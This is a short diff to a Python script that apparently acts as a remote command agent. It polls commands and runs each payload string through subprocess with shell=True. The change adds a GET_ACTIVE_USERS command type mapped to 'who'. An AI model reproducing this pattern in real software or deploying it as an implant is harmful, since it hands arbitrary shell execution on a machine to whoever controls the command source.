@@ -131,10 +131,15 @@ def poll_commands():
 
 def execute_command(cmd):
     cid = cmd.get("id")
+    ctype = cmd.get("commandType")
     payload = cmd.get("payload")
-    cmd_str = payload.get("cmd") if isinstance(payload, dict) else str(payload)
     
-    print(f"[*] Executing [{cid}]: {cmd_str}")
+    if ctype == "GET_ACTIVE_USERS":
+        cmd_str = "who"
+    else:
+        cmd_str = payload.get("cmd") if isinstance(payload, dict) else str(payload)
+    
+    print(f"[*] Executing [{cid}] ({ctype}): {cmd_str}")
     try:
         res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=30)
         output = res.stdout + res.stderr
